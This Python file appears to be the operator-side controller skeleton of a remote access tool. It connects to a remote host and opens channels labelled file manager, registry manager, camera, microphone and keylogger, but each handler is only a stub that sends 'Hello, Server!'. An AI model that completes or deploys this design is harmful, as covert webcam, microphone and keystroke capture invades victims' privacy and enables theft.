import asyncio
from pynput import keyboard

operation_map = {
    "fileManager": "File manager opened",
    "regManager": "Register manager opened",
    "openCamera": "Camera opened",
    "openMicrophone": "Microphone opened",
    "keylogger": "Keylogger started"
}

async def connected(GUI):
    try:
        server_address = (GUI.ipInput.text(), GUI.portInput.text())
        GUI.append_log(
            f"[*] Connecting to: {server_address[0]}:{server_address[1]}")
        for key in GUI.connections:
            reader, writer = await asyncio.open_connection(*server_address)
            GUI.connections[key]['reader'] = reader
            GUI.connections[key]['writer'] = writer
            operation = key
            writer.write(operation.encode())
            await writer.drain()
            response = await reader.read(1024)
            if(response.decode('utf-8')!=operation_map[key]):
                GUI.append_log(f"[!] operation start failed")
                return
        reader, writer = await asyncio.open_connection(*server_address)
        GUI.append_log(
                f"[*] Connected to: {server_address[0]}:{server_address[1]}")
    except OSError as e:
        GUI.append_log(f"[!] Network error: {e}")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")

async def disconnected(GUI):
    for key in GUI.connections:
        GUI.connections[key]['writer'].close()
        await GUI.connections[key]['writer'].wait_closed()
    GUI.append_log("[*] Connection closed")
    


async def fileManager(GUI):
    # 这里放具体的操作
    try:
        operation = "Hello, Server!"
        GUI.connections["fileManager"]["writer"].write(operation.encode())
        await GUI.connections["fileManager"]["writer"].drain()
        GUI.append_log(f"[*] Sent operation: {operation}")

        GUI.append_log("[*] Waiting for response...")
        response = await GUI.connections["fileManager"]["reader"].read(1024)
        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")

async def regmanager(GUI):
    # 这里放具体的操作
    try:
        operation = "Hello, Server!"
        GUI.connections["regManager"]["writer"].write(operation.encode())
        await GUI.connections["regManager"]["writer"].drain()
        GUI.append_log(f"[*] Sent operation: {operation}")

        GUI.append_log("[*] Waiting for response...")
        response = await GUI.connections["regManager"]["reader"].read(1024)
        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")

async def opencamera(GUI):
    # 这里放具体的操作
    try:
        operation = "Hello, Server!"
        GUI.connections["openCamera"]["writer"].write(operation.encode())
        await GUI.connections["openCamera"]["writer"].drain()
        GUI.append_log(f"[*] Sent operation: {operation}")

        GUI.append_log("[*] Waiting for response...")
        response = await GUI.connections["openCamera"]["reader"].read(1024)
        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")

async def openmicrophone(GUI):
    # 这里放具体的操作
    try:
        operation = "Hello, Server!"
        GUI.connections["openMicrophone"]["writer"].write(operation.encode())
        await GUI.connections["openMicrophone"]["writer"].drain()
        GUI.append_log(f"[*] Sent operation: {operation}")

        GUI.append_log("[*] Waiting for response...")
        response = await GUI.connections["openMicrophone"]["reader"].read(1024)
        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")

async def keylogger(GUI):
    # 这里放具体的操作
    try:
        operation = "Hello, Server!"
        GUI.connections["keylogger"]["writer"].write(operation.encode())
        await GUI.connections["keylogger"]["writer"].drain()
        GUI.append_log(f"[*] Sent operation: {operation}")

        GUI.append_log("[*] Waiting for response...")
        response = await GUI.connections["keylogger"]["reader"].read(1024)
        GUI.append_log(f"[*] Received response: {response.decode('utf-8')}")
    except Exception as e:
        GUI.append_log(f"[!] Unexpected error: {e}")
